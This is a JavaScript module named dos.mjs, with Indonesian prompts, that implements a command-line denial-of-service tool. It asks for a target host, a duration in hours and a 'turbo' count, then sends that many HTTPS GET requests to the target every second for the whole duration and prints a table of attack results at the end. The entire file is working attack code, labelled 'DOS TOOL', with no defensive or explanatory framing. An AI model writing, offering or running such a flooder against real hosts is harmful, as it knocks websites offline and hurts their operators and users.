// dos.mjs
import https from 'https';
import readline from 'readline';
import chalk from 'chalk';
import Table from 'cli-table3';
export function dos() {
let totalRequests = 0;
let totalErrors = 0;
let totalBytes = 0;

console.log(chalk.yellow.bold('=== DOS TOOL ==='));
console.log(chalk.yellow('Masukkan target, durasi (jam), dan turbo:'));

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Target host (tanpa https://): ', host => {
  rl.question('Durasi (jam): ', durasiInput => {
    rl.question('Jumlah turbo: ', turboInput => {
      const durasi = parseFloat(durasiInput);
      const turbo = parseInt(turboInput);
      const waktuAwal = new Date();
      const waktuAkhir = Date.now() + durasi * 60 * 60 * 1000;

      console.log(chalk.green(`\nMenyerang https://${host} selama ${durasi} jam dengan ${turbo} turbo...\n`));

      function request() {
        const req = https.get(`https://${host}`, res => {
          totalRequests++;
          totalBytes += parseInt(res.headers['content-length']) || 2048;
          console.log(`${chalk.cyan('[RESPONSE]')} ${res.statusCode} ${res.statusMessage}`);

          res.on('data', () => {});
          res.on('end', () => {});
        });

        req.on('error', err => {
          totalErrors++;
          console.log(`${chalk.red('[ERROR]')} ${err.code || err.message}`);
        });

        req.end();
      }

      const interval = setInterval(() => {
        if (Date.now() >= waktuAkhir) {
          clearInterval(interval);
          const waktuSelesai = new Date();

          const table = new Table({
            head: [chalk.bold('Info'), chalk.bold('Value')],
            style: { head: ['green'] }
          });

          table.push(
            ['Target', host],
            ['Durasi (jam)', durasi],
            ['Turbo', turbo],
            ['Waktu Mulai', waktuAwal.toLocaleString()],
            ['Waktu Selesai', waktuSelesai.toLocaleString()],
            ['Total Request', totalRequests],
            ['Total Error', totalErrors],
            ['Total Traffic', (totalBytes / 1024 / 1024).toFixed(2) + ' MB']
          );

          console.log('\n' + chalk.yellow.bold('=== HASIL SERANGAN ==='));
          console.log(table.toString());

          process.exit();
        }

        for (let i = 0; i < turbo; i++) {
          request();
        }
      }, 1000);

    });
  });
});
};
